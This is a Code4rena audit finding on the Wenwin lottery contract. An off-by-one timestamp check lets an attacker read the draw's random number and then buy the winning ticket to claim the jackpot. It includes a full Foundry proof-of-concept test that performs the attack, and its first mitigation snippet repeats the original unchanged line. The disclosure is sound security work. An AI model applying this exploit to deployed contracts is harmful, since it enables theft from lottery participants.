# Possibility to steal jackpot bypassing restrictions in the executeDraw()

**Severity:** medium
**Auditor:** Code4rena
**Protocol:** Wenwin
**Keywords:** cybersecurity, vulnerability, smart contract, Lottery.sol, executeDraw, random numbers, buy tickets, jackpot, proof of concept, COOL_DOWN_PERIOD, block.timestamp, drawScheduledAt, modifier, LotterySetup.sol, exploit, requestRandomNumber, Chainlink, onRandomNumberFulfilled, RNSourceController.sol, mitigation steps

---

# Lines of code

https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/Lottery.sol#L135
https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/LotterySetup.sol#L114


# Vulnerability details

## Impact
Attacker can run \u0060executeDraw()\u0060 in \u0060Lottery.sol\u0060, receive random numbers and _than_ buy tickets with known numbers in one block.
Harm: Jackpot

## Proof of Concept
This vulnerability is possible to use when contract has been deployed with COOL_DOWN_PERIOD = 0;
The \u0060executeDraw()\u0060 allows to be called at the last second of draw due to an incorrect comparison \u0060block.timestamp\u0060 with \u0060drawScheduledAt(currentDraw)\u0060, what is start of draw.
\u0060\u0060\u0060
    function executeDraw() external override whenNotExecutingDraw {
        // slither-disable-next-line timestamp
        if (block.timestamp < drawScheduledAt(currentDraw)) { //@dingo should be <= here
            revert ExecutingDrawTooEarly();
        }
        returnUnclaimedJackpotToThePot();
        drawExecutionInProgress = true;
        requestRandomNumber();
        emit StartedExecutingDraw(currentDraw);
    }
\u0060\u0060\u0060
Also modifier in LotterySetup.sol allows same action:
\u0060\u0060\u0060
    modifier beforeTicketRegistrationDeadline(uint128 drawId) {
        // slither-disable-next-line timestamp
        if (block.timestamp > ticketRegistrationDeadline(drawId)) { //@dingo should be >= here
            revert TicketRegistrationClosed(drawId);
        }
        _;
    }
\u0060\u0060\u0060


Exploit:
-Attacker is waiting for last second of \u0060PERIOD\u0060 (between to draws).
-Call \u0060executeDraw()\u0060. It will affect at \u0060requestRandomNumber()\u0060 and chainlink will return random number to \u0060onRandomNumberFulfilled()\u0060 at \u0060RNSourceController.sol\u0060.
-Attacker now could read received RandomNumber:
\u0060\u0060\u0060
   uint256 winningTicketTemp = lot.winningTicket(0);
\u0060\u0060\u0060
- Attacker buy new ticket with randomNumber:
\u0060\u0060\u0060
   uint128[] memory drawId2 = new uint128[](1);
   drawId2[0] = 0;
   uint120[] memory winningArray = new uint120[](1);
   winningArray[0] = uint120(winningTicketTemp); 

   lot.buyTickets(drawId2, winningArray, address(0), address(0));
\u0060\u0060\u0060
-Claim winnings:
\u0060\u0060\u0060
   uint256[] memory ticketID = new uint256[](1);
   ticketID[0] = 1;
   lot.claimWinningTickets(ticketID);
\u0060\u0060\u0060

Exploit code:

\u0060\u0060\u0060
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./LotteryTestBase.sol";
import "../src/Lottery.sol";
import "./TestToken.sol";
import "test/TestHelpers.sol";

contract LotteryTestCustom is LotteryTestBase {
  address public eoa = address(1234);
  address public attacker = address(1235);

  function testExploit() public {
    vm.warp(0);
    Lottery lot = new Lottery(
      LotterySetupParams(
        rewardToken,
        LotteryDrawSchedule(2 * PERIOD, PERIOD, COOL_DOWN_PERIOD),
        TICKET_PRICE,
        SELECTION_SIZE,
        SELECTION_MAX,
        EXPECTED_PAYOUT,
        fixedRewards
      ),
      playerRewardFirstDraw,
      playerRewardDecrease,
      rewardsToReferrersPerDraw,
      MAX_RN_FAILED_ATTEMPTS,
      MAX_RN_REQUEST_DELAY
    );

    lot.initSource(IRNSource(randomNumberSource));

    vm.startPrank(eoa);
    rewardToken.mint(1000 ether);
    rewardToken.approve(address(lot), 100 ether);
    rewardToken.transfer(address(lot), 100 ether);
    vm.warp(60 * 60 * 24 + 1);
    lot.finalizeInitialPotRaise();

    uint128[] memory drawId = new uint128[](1);
    drawId[0] = 0;
    uint120[] memory ticketsDigits = new uint120[](1);
    ticketsDigits[0] = uint120(0x0F); //1,2,3,4 numbers choosed;

    ///@dev Origin user buying ticket.
    lot.buyTickets(drawId, ticketsDigits, address(0), address(0));
    vm.stopPrank();

    //====start of attack====
    vm.startPrank(attacker);
    rewardToken.mint(1000 ether);
    rewardToken.approve(address(lot), 100 ether);

    console.log("attacker balance before buying ticket:               ", rewardToken.balanceOf(attacker));

    vm.warp(172800); //Attacker is waiting for deadline of draw period, than he could call executeDraw();
    lot.executeDraw(); //Due to the lack of condition check in executeDraw(\u0060<\u0060 should be \u0060<=\u0060). Also call was sent to chainlink.
    uint256 randomNumber = 0x00;
    vm.stopPrank();

    vm.prank(address(randomNumberSource));
    lot.onRandomNumberFulfilled(randomNumber); //chainLink push here randomNumber;
    uint256 winningTicketTemp = lot.winningTicket(0); //random number from chainlink stores here.
    console.log("Winning ticket number is:                            ", winningTicketTemp);

    vm.startPrank(attacker);
    uint128[] memory drawId2 = new uint128[](1);
    drawId2[0] = 0;
    uint120[] memory winningArray = new uint120[](1);
    winningArray[0] = uint120(winningTicketTemp); //@audit we will buy ticket with stealed random number below;

    lot.buyTickets(drawId2, winningArray, address(0), address(0)); //attacker can buy ticket with stealed random number.

    uint256[] memory ticketID = new uint256[](1);
    ticketID[0] = 1;
    lot.claimWinningTickets(ticketID); //attacker claims winninngs.
    vm.stopPrank();

    console.log("attacker balance after all:                          ", rewardToken.balanceOf(attacker));
  }

  function reconstructTicket(
    uint256 randomNumber,
    uint8 selectionSize,
    uint8 selectionMax
  ) internal pure returns (uint120 ticket) {
    /// Ticket must contain unique numbers, so we are using smaller selection count in each iteration
    /// It basically means that, once \u0060x\u0060 numbers are selected our choice is smaller for \u0060x\u0060 numbers
    uint8[] memory numbers = new uint8[](selectionSize);
    uint256 currentSelectionCount = uint256(selectionMax);

    for (uint256 i = 0; i < selectionSize; ++i) {
      numbers[i] = uint8(randomNumber % currentSelectionCount);
      randomNumber /= currentSelectionCount;
      currentSelectionCount--;
    }

    bool[] memory selected = new bool[](selectionMax);

    for (uint256 i = 0; i < selectionSize; ++i) {
      uint8 currentNumber = numbers[i];
      // check current selection for numbers smaller than current and increase if needed
      for (uint256 j = 0; j <= currentNumber; ++j) {
        if (selected[j]) {
          currentNumber++;
        }
      }
      selected[currentNumber] = true;
      ticket |= ((uint120(1) << currentNumber));
    }
  }
}



\u0060\u0060\u0060


## Tools Used

VScode and manual review.

## Recommended Mitigation Steps

1) Change \u0060<\u0060 by \u0060<=\u0060:
\u0060\u0060\u0060
  function executeDraw() external override whenNotExecutingDraw {
        // slither-disable-next-line timestamp
        if (block.timestamp < drawScheduledAt(currentDraw)) { //@dingo should be <= here
            revert ExecutingDrawTooEarly();
        }
        returnUnclaimedJackpotToThePot();
        drawExecutionInProgress = true;
        requestRandomNumber();
        emit StartedExecutingDraw(currentDraw);
    }
\u0060\u0060\u0060

2) Change \u0060>\u0060 by \u0060>=\u0060:
\u0060\u0060\u0060
   modifier beforeTicketRegistrationDeadline(uint128 drawId) {
        // slither-disable-next-line timestamp
        if (block.timestamp > ticketRegistrationDeadline(drawId)) { //@dingo should be >= here
            revert TicketRegistrationClosed(drawId);
        }
        _;
    }

\u0060\u0060\u0060


